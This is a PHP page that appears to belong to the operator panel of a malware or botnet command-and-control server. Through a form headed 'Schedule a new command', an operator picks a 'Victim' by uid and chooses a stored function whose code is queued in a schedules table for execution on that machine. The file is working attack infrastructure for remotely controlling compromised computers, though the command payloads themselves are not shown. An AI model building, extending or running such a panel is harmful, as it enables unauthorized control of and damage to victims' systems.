<?php
include('login.php');
define('allowed',true);
include('../db.php');
include('header.php');
$uid = (int) $_GET['uid'];
$fid = (int) $_GET['cmd']; //function/command id
if ($fid != 0) {
    //Submit a new schedule
    if ($mysqli->query("INSERT INTO schedules (uid,fid,executed,date,responsedate) VALUES (".$uid.",".$fid.",0,'".date("Y-m-d H:i:s")."','0000-00-00 00:00:00');") === TRUE)
        header("Location: schedules.php?uid=".$uid);
    else
        echo "<p style='color:#FF0000;font-size:20px'>Error in the submission!</p>";
}
?>
    <div class="content">
        <p>
            <h1>Schedule a new command</h1>
        </p>
        <p>
            <form action="" method="GET">
                <p>Victim: <input type="text" name="uid" value="<?php echo $uid ?>" /><p>
                <p>Select command:
                <select name="cmd" onchange="if (typeof(this.selectedIndex) != 'undefined') loadCode(this.options[this.selectedIndex].getAttribute('code'))">
                <?php
                if ($res = $mysqli->query("SELECT * FROM functions;")) {
                    $res->data_seek(0);
                    while ($row = $res->fetch_assoc()) {
                    ?>
                    <option value="<?php echo $row['id'] ?>" code="<?php echo str_replace('"','&quot;',str_replace("'","&apos;",$row['code'])); ?>"><?php echo $row['name'] ?></option>
                    <?php
                    }
                    $res->close();
                }
                ?>
                </select></p>
                <p>Code:<br>
                <textarea id="cd" readonly="true"></textarea>
                </p>
                <p><input type="submit" value="Send!" /></p>
            </form>
        </p>
   </div>
<script>
function loadCode(code) {
    document.getElementById("cd").value = code;
}
</script>
</body>
</html>
<?php
$mysqli->close();
?>
